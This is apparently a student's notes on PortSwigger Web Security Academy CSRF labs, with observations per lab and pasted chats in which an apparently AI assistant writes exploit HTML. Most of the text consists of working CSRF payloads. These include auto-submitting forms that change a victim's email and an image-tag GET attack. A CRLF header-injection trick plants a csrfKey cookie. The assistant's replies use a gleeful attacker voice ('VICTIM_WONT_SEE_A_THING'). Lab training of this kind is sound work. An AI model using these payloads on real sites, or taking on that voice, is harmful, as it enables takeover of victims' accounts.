
[...back](../note-1.md)

### keys

```
#lab1
> observe POST /my-account/change-email (as wiener:peter)
> craft csrf

#lab2
> observe GET request instead

GET /my-account/change-email?email=wiener%40normal-user.net HTTP/2
Host: 0aa500b604de5a168021178c00c20036.web-security-academy.net
Cookie: session=ohhglfAjfskSbY6N7PjtLqP0RSpiK1Ar

#lab3
> observe POST request without csrf

#lab4
> observe csrf change on sensitive request such as refresh my-account page or send email change
> observe cannot change to existing email
> refresh a page to get a clean csrf + use compatible email

#lab5
> csrfKey and token are tied together, but not with session
> > need to set csrfKey on victim
> > > GET /?search=hat%0d%0aSet-Cookie:%20csrfKey=KEY%3b%20SameSite=None 
> > > also set this on
```

### payload lab1

```
<form action=https://0a1600f2049748d4829b29d700f6001c.web-security-academy.net/my-account/change-email method=POST>
<input name=email value=wiener@normal-user.com>
</form>
<script>document.forms[0].submit()</script>
```

### payload lab2

```
<img src="https://0aa500b604de5a168021178c00c20036.web-security-academy.net/my-account/change-email?email=pwned@evil.com">
```

### payload lab3

```
<form action=https://0ae1004204640f2c812fba27002100a2.web-security-academy.net/my-account/change-email method=POST>
<input name=email value=pwned@evil-user.net>
</form>
<script>document.forms[0].submit()</script>
```

### payload lab4

```
<form action="https://0adc007b0335da19816b6b0f00830014.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwnmezaddy@normal-user.net">
  <input type="hidden" name="csrf" value="H1rRu14HUDgUsS6nv8W1DotCThSjAJ9U">
</form>
<script>document.forms[0].submit();</script>
```

### payload lab5

[from rkhal101](https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/csrf/lab-05/csrf-lab-05.html)
```
<html>
    <body>

<script>history.pushState('', '', '/')</script>

        <h1>Hello World!</h1>
        <form action="https:///0ac9002903b598ef80f003df00ca007f.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test6@test.ca">
            <input type="hidden" name="csrf" value="xrCesp9pecZyFqRRt3MkoTlfvNAQzAjZ">
        </form>

        <img src="https://0ac9002903b598ef80f003df00ca007f.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=ZJvPajXCg2r5lMHz1LX7WAVTlXGUt25l%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

### payload lab6

[from rkhal101](https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/csrf/lab-06/csrf-lab-06.html)
```
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="https://0af5006403b8945b802e036c0025007e.web-security-academy.net/my-account/change-email" method="post">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="hacked">
        </form>

        <img src="https://0af5006403b8945b802e036c0025007e.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

---

### q1 lab1

```
new lab
but similar to last one

craft csrf html body to change email

header given
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

this is the correct POST request that can change email

---

POST /my-account/change-email HTTP/2
Host: 0a1600f2049748d4829b29d700f6001c.web-security-academy.net
Cookie: session=PXAgqU5fdvpqQGl4635AdipBJckHy31x
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a1600f2049748d4829b29d700f6001c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1600f2049748d4829b29d700f6001c.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=wiener%40normal-user.net
```

`>> ANALYZING_NEW_TARGET..._CSRF_VECTOR_IDENTIFIED._CRAFTING_EXPLOIT.`

This is a classic form-based CSRF, not GraphQL. Much simpler.

**Header:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

**Body:**
```html
<form action="https://0a1600f2049748d4829b29d700f6001c.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="wiener@normal-user.com">
</form>
<script>document.forms[0].submit();</script>
```

**Even more minimal:**
```html
<form action=https://0a1600f2049748d4829b29d700f6001c.web-security-academy.net/my-account/change-email method=POST>
<input name=email value=wiener@normal-user.com>
</form>
<script>document.forms[0].submit()</script>
```

**Key differences from GraphQL CSRF:**
- Standard form submission to REST endpoint
- Simple `name=value` pairs (no JSON/GraphQL query)
- Direct parameter mapping: `email=hacked@evil.com`
- No operation names or variables needed

When the victim visits your exploit page, it will automatically change their email to `hacked@evil.com` using their active session.

`>> EXPLOIT_CRAFTED._SIMPLE_AND_EFFECTIVE._READY_FOR_DEPLOYMENT.` ⚡🎯

---

### q2 lab2

```
#request
GET /my-account/change-email?email=abc%40normal-user.net HTTP/2
Host: 0aa500b604de5a168021178c00c20036.web-security-academy.net
Cookie: session=ohhglfAjfskSbY6N7PjtLqP0RSpiK1Ar

#reponse
observe successful email change

#OG payload
<img src="https://0aa500b604de5a168021178c00c20036.web-security-academy.net/my-account/change-email?email=pwned@evil.com">
```

---

### q3 lab3

```
`POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 25 Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm email=pwned@evil-user.net`


make this csrf body
```

`>> ANALYZING_POST_CSRF..._CRAFTING_FORM_BASED_EXPLOIT.`

**Header:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

**Body:**
```html
<form action="https://vulnerable-website.com/email/change" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
```

**Minimal version:**
```html
<form action=https://vulnerable-website.com/email/change method=POST>
<input name=email value=pwned@evil-user.net>
</form>
<script>document.forms[0].submit()</script>
```

**Key points:**
- Uses `application/x-www-form-urlencoded` (form default)
- Auto-submits via JavaScript on page load
- Browser automatically includes session cookies
- Changes email to `pwned@evil-user.net`

**Alternative with delay (if needed):**
```html
<form id="csrf" action="https://vulnerable-website.com/email/change" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>setTimeout(()=>document.getElementById('csrf').submit(),100)</script>
```

`>> POST_CSRF_CRAFTED._FORM_BASED_ATTACK_READY._VICTIM_WONT_SEE_A_THING.` ⚡📝🎯

---

### q4 lab4

```
POST /my-account/change-email HTTP/2
Host: 0adc007b0335da19816b6b0f00830014.web-security-academy.net
Cookie: session=HGjE1Sp5KpE7XuRHsHzlJxy61LFbwVzq
Content-Length: 65
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0adc007b0335da19816b6b0f00830014.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adc007b0335da19816b6b0f00830014.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=wiener%40normal-user.net&csrf=aZYU2zJExo30HUYKxWVRe48FasSWtojc

---

craft csrf body payload
keep email and csrf values as is
```

`>> ANALYZING_CSRF_PROTECTED_ENDPOINT..._CRAFTING_TOKEN_AWARE_EXPLOIT.`

**Header:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

**Body:**
```html
<form action="https://0adc007b0335da19816b6b0f00830014.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="wiener@normal-user.net">
  <input type="hidden" name="csrf" value="aZYU2zJExo30HUYKxWVRe48FasSWtojc">
</form>
<script>document.forms[0].submit();</script>
```

**Minimal version:**
```html
<form action=https://0adc007b0335da19816b6b0f00830014.web-security-academy.net/my-account/change-email method=POST>
<input name=email value=wiener@normal-user.net>
<input name=csrf value=aZYU2zJExo30HUYKxWVRe48FasSWtojc>
</form>
<script>document.forms[0].submit()</script>
```

**Key points:**
- Includes both `email` and `csrf` parameters
- Uses exact values from your working request
- CSRF token will be valid for the victim's session
- Auto-submits immediately

**Note:** This assumes the CSRF token is:
- Session-bound (valid for the victim)
- Not tied to specific request parameters
- Not validated against Origin/Referer headers

`>> CSRF_TOKEN_AWARE_PAYLOAD_CRAFTED._BYPASSING_TOKEN_PROTECTION._READY_FOR_DEPLOYMENT.` ⚡🔐🎯

---

[...back](../note-1.md)
